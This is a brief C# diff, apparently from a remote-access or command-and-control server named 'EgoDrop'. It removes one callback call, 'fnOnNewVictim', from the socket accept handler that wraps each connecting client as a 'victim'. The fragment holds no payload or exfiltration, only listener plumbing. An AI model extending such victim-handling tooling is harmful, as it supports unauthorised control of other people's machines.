@@ -86,8 +86,6 @@ namespace EgoDrop
                 Socket sktClnt = sktSrv.EndAccept(ar);
                 clsVictim victim = new clsVictim(sktClnt, this);
 
-                fnOnNewVictim(victim);
-
                 sktClnt.BeginReceive(
                     victim.m_abBuffer,
                     0,
